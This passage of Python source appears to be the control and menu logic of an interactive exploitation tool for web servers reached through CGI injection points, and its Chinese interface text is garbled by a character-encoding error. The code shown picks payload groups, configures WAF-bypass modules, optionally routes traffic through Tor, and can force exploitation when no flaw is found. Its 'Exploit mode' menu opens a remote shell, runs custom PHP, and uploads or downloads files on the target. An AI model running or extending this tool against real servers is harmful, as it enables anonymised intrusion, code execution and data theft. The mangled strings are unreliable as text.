                rprint("[bold red][!] è¼¸å…¥éŒ¯èª¤ï¼Œdelay å¿…é ˆæ˜¯ 0~10 çš„æ•¸å­—[/bold red]")

        elif choice == "5":
            state["enable_log"] = not state["enable_log"]
            rprint("[bold green][*] Log æ¨¡å¼å·²åˆ‡æ›ç‚ºï¼š[/bold green]" + ("[green]é–‹å•Ÿ[/green]" if state["enable_log"] else "[dim]é—œé–‰[/dim]"))

        elif choice == "6":
            state["VERBOSE_MODE"] = not state["VERBOSE_MODE"]
            rprint("[bold green][*] Verbose æ¨¡å¼å·²åˆ‡æ›ç‚ºï¼š[/bold green]" + ("[green]é–‹å•Ÿ[/green]" if state["VERBOSE_MODE"] else "[dim]é—œé–‰[/dim]"))

        elif choice == "7":
            state["disable_effects"] = not state["disable_effects"]
            rprint("[bold green][*] å‹•ç•«æ•ˆæœå·²åˆ‡æ›ç‚ºï¼š[/bold green]" + ("[dim]é—œé–‰[/dim]" if state["disable_effects"] else "[green]é–‹å•Ÿ[/green]"))

        elif choice == "8":
            state["force_mode"] = not state["force_mode"]
            rprint("[bold green][*] å¼·åˆ¶åˆ©ç”¨æ¨¡å¼å·²åˆ‡æ›ç‚ºï¼š[/bold green]" + ("[green]é–‹å•Ÿ[/green]" if state["force_mode"] else "[dim]é—œé–‰[/dim]"))

        elif choice == "9":
            break

        else:
            rprint("[bold red][!] ç„¡æ•ˆçš„é¸æ“‡ï¼Œè«‹é‡æ–°è¼¸å…¥ï¼[/bold red]")


# å¤±æ•—å¾Œå‹•ä½œæ¸…å–®
def show_fail_menu(
    target,
    selected_payload_group,
    bypass_modules_selected,
    bypass_retry_count,
    forced_cgipoints,
    timeout_value,
    delay_between_requests,
    enable_log,
    VERBOSE_MODE,
    disable_effects,
    force_mode,
    first_round=False
):
    print()
    header_text = "[-] æœªæ‰¾åˆ°å¯ç”¨æ¼æ´ï¼Œåˆ‡æ›è¨­å®šå¾Œå¯é¸æ“‡ 6 é‡æ–°æ¸¬è©¦ï¼š" if first_round \
        else "[!] è«‹ç¢ºèªè¨­å®šå¾Œé¸æ“‡ 6 é–‹å§‹æ¸¬è©¦ï¼š"
    panel_style = "bold red" if first_round else "bold yellow"
    console.print(Panel(header_text, title="", style=panel_style, expand=False))

    payload_display = "è‡ªè¨‚" if selected_payload_group not in PAYLOAD_COMBINATIONS else selected_payload_group
    bypass_info = f"{', '.join(bypass_modules_selected)}ï¼›æ¬¡æ•¸ï¼š{bypass_retry_count}" if bypass_modules_selected else "æœªé¸æ“‡"
    cgi_display = "é è¨­" if not forced_cgipoints else ", ".join(forced_cgipoints)

    menu_items = [
        ("1", ":satellite: è®Šæ›´ç›®æ¨™ç¶²å€", f"[bold blue]{target}[/bold blue]"),
        ("2", ":gear: é¸æ“‡ Payload çµ„åˆ", f"[bold cyan]{payload_display}[/bold cyan]"),
        ("3", ":zap: è¨­å®šç¹éæ–¹æ¡ˆ", f"[bold cyan]{bypass_info}[/bold cyan]"),
        ("4", ":wrench: æŒ‡å®š CGI è·¯å¾‘", f"[bold cyan]{cgi_display}[/bold cyan]"),
        ("5", "âš™ï¸ å…¶ä»–åƒæ•¸è¨­å®š", ""),
        ("6", "ğŸ” é–‹å§‹é‡æ–°æ¸¬è©¦", "ï¼ˆä½¿ç”¨ä¸Šåˆ—è¨­å®šï¼‰"),
        ("7", "âŒ é›¢é–‹ç¨‹å¼", "")
    ]

    for idx, desc, info in menu_items:
        sleep_safe(0.05)
        if info:
            rprint(f"[cyan]{idx})[/cyan] {desc} [{info}]")
        else:
            rprint(f"[cyan]{idx})[/cyan] {desc}")

    return input(">> ").strip()


# å¤±æ•—é¸å–®é¸æ“‡
def handle_fail_menu_action(choice, state):
    if choice == "6":
        return "retry"  # å›å‚³ä¿¡è™Ÿçµ¦å¤–éƒ¨ while è¿´åœˆ
    elif choice == "7":
        rprint("[bold yellow][*] ç¨‹å¼çµæŸ[/bold yellow]")
        sys.exit(0)

    print("\n" + "-" * 50)

    if choice == "1":
        state["target"] = input("[?] è¼¸å…¥æ–°ç›®æ¨™ URL: ").strip()
        rprint("[bold green][*] ç›®æ¨™å·²æ›´æ–°[/bold green]")

    elif choice == "2":
        state["selected_payload_group"], _ = show_payload_list()
        state["PAYLOADS"] = PAYLOAD_GROUPS.get(state["selected_payload_group"], PAYLOAD_GROUPS["1"])
        rprint("[bold green][*] Payload å·²æ›´æ–°[/bold green]")

    elif choice == "3":
        state["enable_bypass"] = True
        state["bypass_modules_selected"], state["bypass_retry_count"] = interactive_bypass_setup()
        rprint("[bold green][*] ç¹éè¨­å®šå·²æ›´æ–°[/bold green]")

    elif choice == "4":
        raw = input("è¼¸å…¥ CGI è·¯å¾‘ï¼ˆå¯å¤šå€‹ï¼Œä»¥ç©ºæ ¼åˆ†éš”ï¼Œç•™ç©ºç‚ºé è¨­ï¼‰: ").strip()
        if raw:
            state["forced_cgipoints"] = raw.split()
        else:
            state["forced_cgipoints"] = []
        rprint("[bold green][*] CGI è·¯å¾‘å·²æ›´æ–°[/bold green]")

    elif choice == "5":
        fail_settings_menu(state)

    sleep_safe(0.2)
    return "continue"

# å…¶ä»–åƒæ•¸è¨­å®š
def fail_settings_menu(state):
    while True:
        print()
        sleep_safe(0.07)
        rprint("[bold cyan][âš™ï¸ æ¸¬è©¦åƒæ•¸è¨­å®šé¸å–®][/bold cyan]\n")
        sleep_safe(0.07)
        menu_lines = [
            f"[cyan]1)[/cyan] ç­‰å¾…æ™‚é–“ Timeout           [bold]{state['timeout_value']} ç§’[/bold]",
            f"[cyan]2)[/cyan] è«‹æ±‚å»¶é² Delay             [bold]{state['delay_between_requests']} ç§’[/bold]",
            f"[cyan]3)[/cyan] è‡ªå‹•ç´€éŒ„ Log               {'[bold]é–‹å•Ÿ[/bold]' if state['enable_log'] else '[dim]é—œé–‰[/dim]'}",
            f"[cyan]4)[/cyan] è©³ç´°æ¨¡å¼ Verbose           {'[bold]é–‹å•Ÿ[/bold]' if state['VERBOSE_MODE'] else '[dim]é—œé–‰[/dim]'}",
            f"[cyan]5)[/cyan] å‹•ç•«æ•ˆæœ Effects           {'[dim]é—œé–‰[/dim]' if state['disable_effects'] else '[bold]é–‹å•Ÿ[/bold]'}",
            f"[cyan]6)[/cyan] å¼·åˆ¶åˆ©ç”¨ Force             {'[bold]é–‹å•Ÿ[/bold]' if state['force_mode'] else '[dim]é—œé–‰[/dim]'}",
            f"[cyan]7)[/cyan] ä¿å­˜ä¸¦è¿”å›é¸å–®"
        ]

        for line in menu_lines:
            rprint(line)
            sleep_safe(0.07)

        choice = input(">> ").strip()
        print()

        if choice == "1":
            try:
                val = int(input("è¼¸å…¥ Timeout æ™‚é–“ï¼ˆ1ï½120ï¼Œæˆ– 0 ç‚ºç„¡é™ç­‰å¾…ï¼‰: ").strip())
                if 0 <= val <= 120:
                    state["timeout_value"] = val
                    rprint("[bold green][*] Timeout å·²æ›´æ–°[/bold green]")
                else:
                    rprint("[red][!] è«‹è¼¸å…¥ 0~120 ä¹‹é–“çš„æ•´æ•¸[/red]")
            except:
                rprint("[red][!] è¼¸å…¥æ ¼å¼éŒ¯èª¤[/red]")

        elif choice == "2":
            try:
                val = float(input("è¼¸å…¥å»¶é²ç§’æ•¸ï¼ˆä¾‹å¦‚ 1.5ï¼Œå¯ç‚º 0ï¼‰: ").strip())
                if 0 <= val <= 10:
                    state["delay_between_requests"] = val
                    rprint("[bold green][*] å»¶é²æ™‚é–“å·²æ›´æ–°[/bold green]")
                else:
                    rprint("[red][!] å»¶é²è«‹è¼¸å…¥ 0ï½10 ç§’[/red]")
            except:
                rprint("[red][!] è¼¸å…¥æ ¼å¼éŒ¯èª¤[/red]")

        elif choice == "3":
            state["enable_log"] = not state["enable_log"]
            rprint(f"[bold green][*] Log å·²åˆ‡æ›ç‚º {'é–‹å•Ÿ' if state['enable_log'] else 'é—œé–‰'}[/bold green]")

        elif choice == "4":
            state["VERBOSE_MODE"] = not state["VERBOSE_MODE"]
            rprint(f"[bold green][*] Verbose å·²åˆ‡æ›ç‚º {'é–‹å•Ÿ' if state['VERBOSE_MODE'] else 'é—œé–‰'}[/bold green]")

        elif choice == "5":
            state["disable_effects"] = not state["disable_effects"]
            rprint(f"[bold green][*] å‹•ç•«æ¨¡å¼å·²åˆ‡æ›ç‚º {'é—œé–‰' if state['disable_effects'] else 'é–‹å•Ÿ'}[/bold green]")

        elif choice == "6":
            state["force_mode"] = not state["force_mode"]
            rprint(f"[bold green][*] å¼·åˆ¶åˆ©ç”¨æ¨¡å¼å·²åˆ‡æ›ç‚º {'é–‹å•Ÿ' if state['force_mode'] else 'é—œé–‰'}[/bold green]")

        elif choice == "7":
            break
        else:
            rprint("[red][!] ç„¡æ•ˆé¸é …ï¼Œè«‹é‡æ–°è¼¸å…¥[/red]")


# main å‡½æ•¸
def main():
    global timeout_value, PAYLOADS, selected_payload_group, VERBOSE_MODE, enable_log, use_tor, tor_session, disable_effects, forced_cgipoints, delay_between_requests

    args = parse_arguments()
    target = args.url
            
    enable_log = args.log
    VERBOSE_MODE = args.verbose
    use_tor = args.tor
    enable_bypass = args.bypass
    force_mode = args.force
    disable_effects = args.no_effects
    forced_cgipoints = args.cgipoint or []
    delay_between_requests = args.delay
    #disable_effects = false

    if disable_effects:
        banner.print_static_banner()
        banner.Show_Disclaimer(no_effects=True)
    else:
        banner.play_banner(use_tor, enable_bypass)
        banner.Show_Disclaimer()
        
    if delay_between_requests > 0:
        rprint("[bold green][*] å·²è¨­ç½® delay æ¨¡å¼[/bold green]")
            
    if args.timeout == 0:
        rprint("[bold green][*] å·²è¨­ç½®ç‚ºç„¡é™ç­‰å¾…[/bold green]")
    elif args.timeout > 120:
        rprint("[bold red][!] ç­‰å¾…æ™‚é–“éä¹… (è¶…é 120 ç§’)ï¼Œå¦‚éœ€è¦ç„¡é™ç­‰å¾…è«‹ä½¿ç”¨ --timeout=0[/bold red]")
        sys.exit(1)
    elif args.timeout > 30:
        timeout_value = args.timeout
        rprint("[bold yellow][!] è­¦å‘Šï¼štimeout è¶…é 30 ç§’ï¼Œæ¸¬è©¦å¯èƒ½æœƒè€—æ™‚è¼ƒä¹…[/bold yellow]")
    elif args.timeout < 1:
        rprint("[bold red][!] éŒ¯èª¤ï¼štimeout å¿…é ˆç‚º 0 æˆ– 1~120 ä¹‹é–“çš„æ•´æ•¸[/bold red]")
        sys.exit(1)
    else:
        timeout_value = args.timeout
        if args.timeout != 10:
            rprint(f"[bold green][*] è¨­å®šè«‹æ±‚è¶…æ™‚æ™‚é–“ç‚º {timeout_value} ç§’[/bold green]")

    if use_tor:
        tor_session = tor_helper.get_tor_session()
        if not tor_session:
            sys.exit(1)

    # Payloadé¸æ“‡é‚è¼¯å€å¡Š
    generate_payload_groups()

    if args.payload == "C":
        rprint("\n[bold cyan][*] é€²å…¥è‡ªè¨‚ Payload æ¨¡å¼...[/bold cyan]")
        selected_payload_group = customize_payload()
    elif args.payload and args.payload in PAYLOAD_GROUPS:
        selected_payload_group = args.payload
    elif args.payload:
        rprint("\n[bold yellow][!] ç„¡æ•ˆæˆ–éºæ¼çš„ Payload çµ„åˆï¼Œé€²å…¥é¸æ“‡ä»‹é¢[/bold yellow]")
        selected_payload_group, PAYLOADS = show_payload_list()
    else:
        selected_payload_group = "1" #é è¨­

    # ç¢ºä¿ PAYLOADS ä¸€å®šå°æ‡‰æ­£ç¢º
    PAYLOADS = PAYLOAD_GROUPS.get(selected_payload_group, PAYLOAD_GROUPS["1"])

    bypass_modules_selected = []
    bypass_retry_count = 1
    if enable_bypass:
        bypass_modules_selected, bypass_retry_count = interactive_bypass_setup()

    while True:
        selected_cgipoint, selected_payload = None, None
        next_action = None 
        already_scanned_this_round = False
        rprint("[bold green][*] é–‹å§‹æ¸¬è©¦...[/bold green]")

        if enable_bypass and bypass_modules_selected:
            rprint("[bold cyan][*][/bold cyan] å·²å•Ÿç”¨ Bypass æ¨¡å¼ï¼Œå¥—ç”¨ä»¥ä¸‹ç¹éç­–ç•¥ï¼š")
            for name in bypass_modules_selected:
                rprint(f"[cyan]    - {name}[/cyan]")            
            rprint(f"\n[bold cyan][*][/bold cyan] å°‡é‡è©¦æ¯çµ„ç¹éçµ„åˆ [bold]{bypass_retry_count}[/bold] æ¬¡\n")

            selected_cgipoint, selected_payload = run_bypass_mode(
                target,
                bypass_modules_selected,
                bypass_retry_count,
                forced_cgipoints
            )
            already_scanned_this_round = True

        if not already_scanned_this_round:
            for p in PAYLOADS:
                ep = choose_cgipoint(target, p, forced_cgipoints)
                if ep:
                    selected_cgipoint, selected_payload = ep, p
                    break
                    
        fail_menu_first_time = True
        
        if not selected_cgipoint and force_mode:
            rprint("[bold violet][*] å•Ÿç”¨ --force æ¨¡å¼ï¼Œå°‡å¼·åˆ¶é€²å…¥æ¼æ´åˆ©ç”¨åŠŸèƒ½é¸å–®[/bold violet]\n")
            selected_cgipoint = CGI_POINTS[0]
            selected_payload = list(PAYLOADS.keys())[0]
            
        fail_menu_first_time = True
        
        while not selected_cgipoint:
            next_action = show_fail_menu(
                target,
                selected_payload_group,
                bypass_modules_selected,
                bypass_retry_count,
                forced_cgipoints,
                timeout_value,
                delay_between_requests,
                enable_log,
                VERBOSE_MODE,
                disable_effects,
                force_mode,
                first_round=fail_menu_first_time
            )
            print()
            fail_menu_first_time = False

            # ç”¨ dict å‚³å…¥è¦æ›´æ–°çš„ state
            menu_state = {
                "target": target,
                "selected_payload_group": selected_payload_group,
                "PAYLOADS": PAYLOADS,
                "enable_bypass": enable_bypass,
                "bypass_modules_selected": bypass_modules_selected,
                "bypass_retry_count": bypass_retry_count,
                "forced_cgipoints": forced_cgipoints,
                "timeout_value": timeout_value,
                "delay_between_requests": delay_between_requests,
                "enable_log": enable_log,
                "VERBOSE_MODE": VERBOSE_MODE,
                "disable_effects": disable_effects,
                "force_mode": force_mode
            }


             # é€™è£¡æ˜¯handlerçš„å‘¼å«
            result = handle_fail_menu_action(next_action, menu_state)

            # å›æ”¶è®Šæ•¸
            target = menu_state["target"]
            selected_payload_group = menu_state["selected_payload_group"]
            PAYLOADS = menu_state["PAYLOADS"]
            enable_bypass = menu_state["enable_bypass"]
            bypass_modules_selected = menu_state["bypass_modules_selected"]
            bypass_retry_count = menu_state["bypass_retry_count"]
            forced_cgipoints = menu_state["forced_cgipoints"]
            timeout_value = menu_state["timeout_value"]
            delay_between_requests = menu_state["delay_between_requests"]
            enable_log = menu_state["enable_log"]
            VERBOSE_MODE = menu_state["VERBOSE_MODE"]
            disable_effects = menu_state["disable_effects"]
            force_mode = menu_state["force_mode"]

            if result == "retry":
                break

        if next_action != "4" and not selected_cgipoint:
            continue

        while selected_cgipoint:
            sleep_safe(0.05)
            header = Text(" Exploit æ¨¡å¼é¸å–® ", style="bold cyan")
            body = Text()
            body.append("ç•¶å‰ç›®æ¨™ï¼š", style="cyan")
            body.append(f"{target}\n", style="sky_blue1")
            body.append("ç•¶å‰æ³¨å…¥é»ï¼š", style="cyan")
            body.append(f"{selected_cgipoint}\n", style="sky_blue1")
            body.append("æ¼æ´ç·¨è™Ÿï¼š", style="cyan")
            body.append(f"{selected_payload}", style="sky_blue1")

            console.print(Panel(body, title=header, border_style="bright_blue", expand=False))

            # å®šç¾©é¸å–®é …ç›®èˆ‡å°æ‡‰è¡Œç‚º
            menu_items = [
                ("1", "ğŸ§ª Shellæ¨¡å¼", lambda: exploit_shell(target, selected_cgipoint, selected_payload, bypass_modules_selected)),
                ("2", "ğŸ› ï¸ PHPè‡ªè¨‚ç«¯æ¨¡å¼", lambda: custom_php_mode(target, selected_cgipoint, selected_payload, bypass_modules_selected)),
                ("3", "ğŸ“¤ ä¸Šå‚³æª”æ¡ˆ", lambda: upload_file(target, selected_cgipoint, selected_payload, bypass_modules_selected)),
                ("4", "ğŸ“¥ ä¸‹è¼‰æª”æ¡ˆ", lambda: download_file(target, selected_cgipoint, selected_payload, bypass_modules_selected)),
                ("5", "ğŸ¯ åˆ‡æ›æ”»æ“Šç›®æ¨™", "switch_target"),
                ("6", "âš™ï¸ è¨­å®šåƒæ•¸", "settings"),
                ("7", "âŒ é›¢é–‹ç¨‹å¼", "exit")
            ]

            for idx, desc, _ in menu_items:
                sleep_safe(0.07)
                rprint(f"[cyan]{idx})[/cyan] {desc}")

            choice = input(">> ").strip()
            print()

            matched = next((item for item in menu_items if item[0] == choice), None)

            if matched:
                action = matched[2]
                if callable(action):
                    action()
                elif action == "switch_target":
                    target = input("è¼¸å…¥æ–°ç›®æ¨™URL: ").strip()
                    print()
                    break  # è·³å‡ºè¿´åœˆé‡æ–°æƒæç›®æ¨™
                elif action == "settings":
                    # å»ºç«‹è¨­å®šç‹€æ…‹ dict å‚³å…¥
                    state = {
                        "selected_payload_group": selected_payload_group,
                        "bypass_modules_selected": bypass_modules_selected,
                        "timeout_value": timeout_value,
                        "delay_between_requests": delay_between_requests,
                        "enable_log": enable_log,
                        "VERBOSE_MODE": VERBOSE_MODE,
                        "disable_effects": disable_effects,
                        "force_mode": force_mode,
                        "PAYLOADS": PAYLOADS
                    }

                    exploit_settings_menu(state)

                    # å›å¯«æ›´æ–°å¾Œåƒæ•¸
                    selected_payload_group = state["selected_payload_group"]
                    bypass_modules_selected = state["bypass_modules_selected"]
                    timeout_value = state["timeout_value"]
                    delay_between_requests = state["delay_between_requests"]
                    enable_log = state["enable_log"]
                    VERBOSE_MODE = state["VERBOSE_MODE"]
                    disable_effects = state["disable_effects"]
                    force_mode = state["force_mode"]
                    PAYLOADS = state["PAYLOADS"]

                elif action == "exit":
                    rprint("[bold yellow][*] ç¨‹å¼çµæŸ[/bold yellow]")
                    sys.exit(0)
            else:
                rprint("[bold red][!] ç„¡æ•ˆçš„é¸æ“‡ï¼Œè«‹é‡æ–°é¸æ“‡[/bold red]\n")

if __name__ == "__main__":
    main()




